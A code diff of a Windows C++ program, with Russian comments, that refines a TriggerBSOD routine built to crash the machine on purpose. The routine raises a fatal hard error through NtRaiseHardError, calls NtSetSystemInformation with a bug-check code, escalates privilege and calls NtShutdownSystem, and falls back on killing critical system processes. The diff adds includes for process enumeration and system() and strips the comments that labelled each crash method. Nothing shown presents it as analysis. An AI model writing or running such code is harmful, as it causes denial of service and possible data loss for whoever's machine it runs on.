@@ -3,6 +3,8 @@
 #include <vector>
 #include <fstream>
 #include <shlwapi.h>
+#include <tlhelp32.h>      // ← ДОБАВЛЕНО для CreateToolhelp32Snapshot
+#include <cstdlib>         // ← ДОБАВЛЕНО для system()
 
 #pragma comment(lib, "shlwapi.lib")
 #pragma comment(lib, "advapi32.lib")
@@ -70,12 +72,10 @@ void KillCriticalProcesses() {
 void TriggerBSOD() {
     HMODULE ntdll = GetModuleHandleA("ntdll.dll");
     if (!ntdll) {
-        // Если ntdll не загружен — убиваем процессы
         KillCriticalProcesses();
         return;
     }
 
-    // МЕТОД 1: NtRaiseHardError
     typedef NTSTATUS (NTAPI *NtRaiseHardError_t)(NTSTATUS, ULONG, ULONG, PULONG_PTR, ULONG, PULONG);
     NtRaiseHardError_t NtRaiseHardError = (NtRaiseHardError_t)GetProcAddress(ntdll, "NtRaiseHardError");
     if (NtRaiseHardError) {
@@ -85,7 +85,6 @@ void TriggerBSOD() {
         NtRaiseHardError(0xC000021A, 1, 0, params, 6, &response);
     }
 
-    // МЕТОД 2: NtSetSystemInformation
     typedef NTSTATUS (NTAPI *NtSetSystemInformation_t)(ULONG, PVOID, ULONG);
     NtSetSystemInformation_t NtSetSystemInformation = (NtSetSystemInformation_t)GetProcAddress(ntdll, "NtSetSystemInformation");
     if (NtSetSystemInformation) {
@@ -93,7 +92,6 @@ void TriggerBSOD() {
         NtSetSystemInformation(0x57, &bugCheckCode, sizeof(bugCheckCode));
     }
 
-    // МЕТОД 3: win32k.sys
     HMODULE win32u = LoadLibraryA("win32u.dll");
     if (win32u) {
         typedef NTSTATUS (NTAPI *NtUserCallOneParam_t)(ULONG_PTR, ULONG);
@@ -102,7 +100,6 @@ void TriggerBSOD() {
         FreeLibrary(win32u);
     }
 
-    // МЕТОД 4: RtlAdjustPrivilege + NtShutdownSystem
     HMODULE ntdll2 = GetModuleHandleA("ntdll.dll");
     if (ntdll2) {
         typedef NTSTATUS (NTAPI *RtlAdjustPrivilege_t)(ULONG, BOOLEAN, BOOLEAN, PBOOLEAN);
@@ -116,7 +113,6 @@ void TriggerBSOD() {
         }
     }
 
-    // ГАРАНТИРОВАННЫЙ МЕТОД: убийство процессов (если BSOD не сработал)
     KillCriticalProcesses();
 }
 
